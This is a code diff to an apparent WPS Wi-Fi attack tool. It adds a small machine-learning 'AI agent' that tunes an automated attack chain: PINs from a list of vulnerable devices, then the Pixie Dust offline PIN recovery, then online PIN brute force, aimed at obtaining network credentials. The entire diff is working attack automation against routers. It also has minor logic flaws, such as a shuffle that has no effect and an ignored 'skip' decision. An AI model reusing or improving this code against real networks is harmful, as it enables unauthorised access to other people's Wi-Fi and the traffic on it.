@@ -3049,7 +3049,7 @@ def setupDirectories():
         except OSError as e:
             logger.error(f'Failed to rename data directory: {e}')
 
-    for directory in [src.utils.SESSIONS_DIR, src.utils.PIXIEWPS_DIR]:
+    for directory in [src.utils.SESSIONS_DIR, src.utils.PIXIEWPS_DIR, AIAgent._DIR]:
         if not os.path.exists(directory):
             os.makedirs(directory)
 
@@ -3073,6 +3073,278 @@ def setupMediatekWifi(wmt_wifi_device: Path):
     wmt_wifi_device.write_text('1', encoding='utf-8')
 
 
+# ---------------------------------------------------------------------------
+# AI Agent — lightweight ML decision engine (scikit-learn or rule-based fallback)
+# ---------------------------------------------------------------------------
+
+class AIAgent:
+    """Lightweight ML agent for WPS attack optimization.
+
+    Uses a small Random Forest (when scikit-learn is installed) to predict the
+    best action at each phase of the auto-attack chain.  When ML libraries are
+    absent the agent falls back to pure rule-based heuristics — no functionality
+    is lost.
+
+    On first run the agent generates synthetic training data from domain rules
+    so the model is immediately useful.  Each subsequent attack adds real
+    observations; the model retrains periodically and improves over time.
+
+    Model + data are stored under ``~/.OneShot-Extended/ai_agent.joblib`` and
+    ``ai_data.pkl``.  Total size stays well under 50 MB.
+    """
+
+    _DIR   = os.path.join(os.path.expanduser('~'), '.OneShot-Extended')
+    _MODEL = os.path.join(_DIR, 'ai_agent.joblib')
+    _DATA  = os.path.join(_DIR, 'ai_data.pkl')
+
+    _FEATS = [
+        'signal', 'wps_ver', 'wps_locked', 'is_vuln',
+        'attempt', 'timeouts', 'resp_delay', 'm_msgs',
+        'fails', 'sig_ok', 'oui',
+    ]
+
+    ACTIONS = ('proceed', 'wait', 'skip', 'abort')
+
+    # ------------------------------------------------------------------
+    # Lifecycle
+    # ------------------------------------------------------------------
+
+    def __init__(self):
+        self.has_ml = False
+        self.model  = None
+        self.X: list[list[float]] = []
+        self.y: list[str]          = []
+
+        try:
+            import sklearn.ensemble   # noqa: F401
+            import joblib             # noqa: F401
+            self.has_ml = True
+        except ImportError:
+            pass
+
+        self._load()
+
+        # Cold start — no saved data yet → generate synthetic dataset
+        if len(self.X) < 5:
+            self._pretrain()
+
+        logger.info(f'[AI] {self.status()}')
+
+    # ------------------------------------------------------------------
+    # Persistence
+    # ------------------------------------------------------------------
+
+    def _load(self):
+        if os.path.exists(self._DATA):
+            try:
+                import pickle
+                with open(self._DATA, 'rb') as fh:
+                    d = pickle.load(fh)
+                self.X = d.get('X', [])
+                self.y = d.get('y', [])
+            except Exception:
+                pass
+
+        if self.has_ml and os.path.exists(self._MODEL):
+            try:
+                import joblib
+                self.model = joblib.load(self._MODEL)
+            except Exception:
+                self.model = None
+
+        if self.has_ml and self.model is None and len(self.X) >= 20:
+            self._train()
+
+    def _save(self):
+        try:
+            os.makedirs(self._DIR, exist_ok=True)
+            import pickle
+            with open(self._DATA, 'wb') as fh:
+                pickle.dump({'X': self.X[-500:], 'y': self.y[-500:]}, fh)
+        except Exception:
+            pass
+
+    def finalize(self):
+        """Save model + data — call once at the end of the attack chain."""
+        if self.has_ml and len(self.X) >= 10:
+            self._train()
+        self._save()
+
+    # ------------------------------------------------------------------
+    # Training
+    # ------------------------------------------------------------------
+
+    def _train(self):
+        if not self.has_ml or len(self.X) < 10:
+            return
+        import numpy as np
+        from sklearn.ensemble import RandomForestClassifier
+
+        X = np.array(self.X[-500:])
+        y = np.array(self.y[-500:])
+
+        for cls in self.ACTIONS:
+            if cls not in y:
+                X = np.vstack([X, np.zeros((1, len(self._FEATS)))])
+                y = np.append(y, cls)
+
+        self.model = RandomForestClassifier(
+            n_estimators=5, max_depth=4, random_state=42,
+        )
+        self.model.fit(X, y)
+
+        try:
+            import joblib
+            os.makedirs(self._DIR, exist_ok=True)
+            joblib.dump(self.model, self._MODEL)
+        except Exception:
+            pass
+
+    def _pretrain(self):
+        """Generate ~200 synthetic training samples from domain knowledge."""
+        import random
+        random.seed(42)
+
+        base = {
+            'bssid': '00:00:00:00:00:00', 'signal': -50,
+            'wps_version': '2.0', 'wps_locked': False,
+            'is_vulnerable': False, 'attempt': 1,
+            'timeouts': 0, 'resp_delay': 2.0,
+            'm_msgs': 3, 'fails': 0,
+        }
+
+        rules = [
+            ({'signal': -45, 'm_msgs': 4, 'fails': 0},           'proceed', 30),
+            ({'signal': -55, 'is_vulnerable': True, 'm_msgs': 3}, 'proceed', 25),
+            ({'wps_locked': True, 'fails': 0},                     'wait',    20),
+            ({'signal': -80, 'timeouts': 5, 'm_msgs': 0, 'fails': 5}, 'abort', 25),
+            ({'signal': -60, 'timeouts': 1, 'm_msgs': 2},         'proceed', 15),
+            ({'signal': -80, 'timeouts': 3, 'm_msgs': 0, 'fails': 3}, 'skip', 20),
+            ({'signal': -60, 'm_msgs': 0, 'fails': 0},            'proceed', 25),
+            ({'signal': -65, 'timeouts': 2, 'm_msgs': 0, 'fails': 4}, 'abort', 20),
+            ({'signal': -50, 'wps_locked': True, 'is_vulnerable': True}, 'wait', 15),
+            ({'signal': -70, 'attempt': 1, 'm_msgs': 0, 'fails': 0}, 'proceed', 10),
+        ]
+
+        for overrides, label, count in rules:
+            for _ in range(count):
+                ctx = {**base, **overrides, 'attempt': random.randint(1, 5)}
+                self.X.append(self.extract(ctx))
+                self.y.append(label)
+
+        random.shuffle(list(zip(self.X, self.y)))
+        if self.has_ml:
+            self._train()
+        self._save()
+
+    # ------------------------------------------------------------------
+    # Feature extraction
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _norm_signal(dbm: float) -> float:
+        return max(0.0, min(1.0, (dbm + 90) / 50))
+
+    @staticmethod
+    def _oui_hash(bssid: str) -> float:
+        clean = bssid.replace(':', '').replace('-', '')[:6]
+        try:
+            return int(clean, 16) / 0xFFFFFF
+        except ValueError:
+            return 0.5
+
+    def extract(self, ctx: dict) -> list[float]:
+        return [
+            self._norm_signal(ctx.get('signal', -50)),
+            1.0 if str(ctx.get('wps_version', '1.0')) == '2.0' else 0.0,
+            1 if ctx.get('wps_locked', False) else 0,
+            1 if ctx.get('is_vulnerable', False) else 0,
+            min(ctx.get('attempt', 1), 20) / 20.0,
+            min(ctx.get('timeouts', 0), 10) / 10.0,
+            min(ctx.get('resp_delay', 0.0), 30.0) / 30.0,
+            min(ctx.get('m_msgs', 0), 8) / 8.0,
+            min(ctx.get('fails', 0), 10) / 10.0,
+            1.0 if ctx.get('signal', -50) > -70 else 0.0,
+            self._oui_hash(ctx.get('bssid', '00:00:00:00:00:00')),
+        ]
+
+    # ------------------------------------------------------------------
+    # Decision
+    # ------------------------------------------------------------------
+
+    def decide(self, phase: str, ctx: dict) -> str:
+        """Return 'proceed', 'wait', 'skip', or 'abort'."""
+        feat = self.extract(ctx)
+
+        if self.has_ml and self.model is not None:
+            try:
+                import numpy as np
+                pred   = self.model.predict([feat])[0]
+                proba  = max(self.model.predict_proba([feat])[0])
+                if proba >= 0.4:
+                    return pred
+            except Exception:
+                pass
+
+        return self._heuristic(feat, phase)
+
+    def _heuristic(self, f: list[float], _phase: str) -> str:
+        locked  = f[2]
+        vuln    = f[3]
+        sig_ok  = f[9]
+        timeouts = f[5] * 10
+        m_msgs   = f[7] * 8
+        fails    = f[8] * 10
+        attempt  = f[4] * 20
+
+        if locked and fails > 5:
+            return 'abort'
+        if timeouts >= 3 and m_msgs == 0:
+            return 'abort'
+        if fails >= 5 and m_msgs == 0:
+            return 'abort'
+        if locked:
+            return 'wait'
+        if attempt <= 1:
+            return 'proceed'
+        if vuln and attempt <= 5:
+            return 'proceed'
+        if sig_ok and attempt <= 3:
+            return 'proceed'
+        if attempt > 3 and m_msgs == 0:
+            return 'skip'
+        return 'proceed'
+
+    # ------------------------------------------------------------------
+    # Online learning
+    # ------------------------------------------------------------------
+
+    def record(self, ctx: dict, action: str, success: bool):
+        feat = self.extract(ctx)
+        self.X.append(feat)
+        self.y.append('proceed' if success else 'skip')
+
+        if len(self.X) > 500:
+            self.X, self.y = self.X[-500:], self.y[-500:]
+        if len(self.X) % 10 == 0 and self.has_ml:
+            self._train()
+
+    def predict_timeout(self, base: float, ctx: dict) -> float:
+        signal   = ctx.get('signal', -50)
+        timeouts = ctx.get('timeouts', 0)
+        if signal < -80:
+            return base * 1.5
+        if signal > -50 and timeouts == 0:
+            return base * 0.7
+        if timeouts >= 2:
+            return base * 0.5
+        return base
+
+    def status(self) -> str:
+        mode = 'ML' if (self.has_ml and self.model) else 'heuristic'
+        return f'AI Agent ready ({mode}, {len(self.X)} observations)'
+
+
 def scanForNetworks(interface: str, vuln_list: list[str]) -> tuple[str, dict] | None:
     """Scan, and prompt user to select network"""
 
@@ -3081,64 +3353,112 @@ def scanForNetworks(interface: str, vuln_list: list[str]) -> tuple[str, dict] | 
 
 def autoAttack(interface: str, bssid: str, vuln_list_file: str,
                network_info: dict = None, explicit_pin: str = None) -> bool:
-    """Smart auto-attack: vulnerable list PIN → Pixie Dust → online bruteforce.
+    """AI-driven auto-attack: vuln list PIN -> Pixie Dust -> online bruteforce.
 
-    When a BSSID is selected (via scan or --bssid) without explicit attack flags
-    (-P, -B, -p, -N, --pbc), this function runs the full chain automatically:
-
-      1. Check the BSSID against the 612-entry vulnerable device list (OUI match).
-         If matched, try each probable PIN.
-      2. If none worked (or no match), run Pixie Dust — send a likely PIN, capture
-         the WPS exchange, then use pixiewps to recover the PIN offline.
-      3. If Pixie Dust also failed, fall back to online 8-digit PIN bruteforce.
+    The embedded AIAgent decides at each phase whether to proceed, wait, skip,
+    or abort — based on real-time metrics (signal, WPS state, timeouts, etc.).
 
     Returns True on success (credentials obtained), False otherwise.
     """
 
+    agent     = AIAgent()
     generator = src.wps.generator.WPSpin()
-    success = False
 
-    # --- Step 1: Vulnerable list ---
+    # Build initial context from scan data
+    ctx = {
+        'bssid':         bssid,
+        'signal':        network_info.get('Level', -50)        if network_info else -50,
+        'wps_version':   network_info.get('WPS version', '1.0') if network_info else '1.0',
+        'wps_locked':    network_info.get('WPS locked', False)  if network_info else False,
+        'is_vulnerable': False,
+        'attempt':       1,
+        'timeouts':      0,
+        'resp_delay':    0.0,
+        'm_msgs':        0,
+        'fails':         0,
+    }
+
+    # ----- Step 1: Vulnerable list -----
     algos = generator._getSuggested(bssid)
+    ctx['is_vulnerable'] = len(algos) > 0
+
     if algos:
-        logger.info(f'[Auto] {len(algos)} vulnerable device algorithm(s) matched — trying list PIN(s)…')
+        action = agent.decide('vuln_list', ctx)
+        logger.info(f'[AI] vuln_list -> {action}')
+
+        if action == 'abort':
+            agent.finalize()
+            return False
+
+        if action != 'skip':
+            connection = src.wps.connection.Initialize(interface)
+            for algo in algos:
+                pin = algo.get('pin', '')
+                if pin:
+                    logger.info(f'[AI] Trying PIN \'{pin}\' ({algo["name"]})')
+                    success = connection.singleConnection(bssid, pin)
+                    cs = connection.CONNECTION_STATUS
+                    ctx['m_msgs']   = cs.LAST_M_MESSAGE
+                    ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
+                    ctx['fails']    = 0 if success else 1
+                    agent.record(ctx, 'proceed', success)
+                    if success:
+                        agent.finalize()
+                        return True
+            logger.warning('[AI] Vuln list PINs did not succeed')
+            try:
+                connection._cleanup()
+            except Exception:
+                pass
+
+    # ----- Step 2: Pixie Dust (offline) -----
+    ctx['attempt'] = 2
+    action = agent.decide('pixie_dust', ctx)
+    logger.info(f'[AI] pixie_dust -> {action}')
+
+    if action == 'abort':
+        agent.finalize()
+        return False
+
+    if action != 'skip':
+        logger.info('[AI] Trying Pixie Dust attack...')
+        likely_pin = explicit_pin or generator.getLikely(bssid) or '12345670'
         connection = src.wps.connection.Initialize(interface)
-        for algo in algos:
-            pin = algo.get('pin', '')
-            if pin:
-                logger.info(f'[Auto] Trying PIN \'{pin}\' ({algo["name"]})')
-                success = connection.singleConnection(bssid, pin)
-                if success:
-                    return True
-        logger.warning('[Auto] Vulnerable list PINs did not succeed')
+
+        saved_pixie = args.pixie_dust
+        args.pixie_dust = True
+        success = connection.singleConnection(bssid, likely_pin)
+        cs = connection.CONNECTION_STATUS
+        ctx['m_msgs']   = cs.LAST_M_MESSAGE
+        ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
+        ctx['fails']    = 0 if success else 1
+        agent.record(ctx, 'proceed', success)
+        args.pixie_dust = saved_pixie
+
+        if success:
+            agent.finalize()
+            return True
+
+        logger.warning('[AI] Pixie Dust did not recover the PIN')
         try:
             connection._cleanup()
         except Exception:
             pass
 
-    # --- Step 2: Pixie Dust (offline) ---
-    logger.info('[Auto] Trying Pixie Dust attack…')
-    likely_pin = explicit_pin or generator.getLikely(bssid) or '12345670'
-    connection = src.wps.connection.Initialize(interface)
+    # ----- Step 3: Online bruteforce -----
+    ctx['attempt'] = 3
+    action = agent.decide('bruteforce', ctx)
+    logger.info(f'[AI] bruteforce -> {action}')
 
-    saved_pixie = args.pixie_dust
-    args.pixie_dust = True
-    success = connection.singleConnection(bssid, likely_pin)
-    args.pixie_dust = saved_pixie
+    if action == 'abort':
+        logger.info('[AI] Skipping bruteforce (low success probability)')
+        agent.finalize()
+        return False
 
-    if success:
-        return True
-
-    logger.warning('[Auto] Pixie Dust did not recover the PIN')
-    try:
-        connection._cleanup()
-    except Exception:
-        pass
-
-    # --- Step 3: Online bruteforce ---
-    logger.info('[Auto] Falling back to online bruteforce…')
+    logger.info('[AI] Falling back to online bruteforce...')
     bf = src.wps.bruteforce.Initialize(interface)
-    bf.smartBruteforce(bssid, None)
+    bf.smartBruteforce(bssid, '0000')
+    agent.finalize()
     return False
 
 
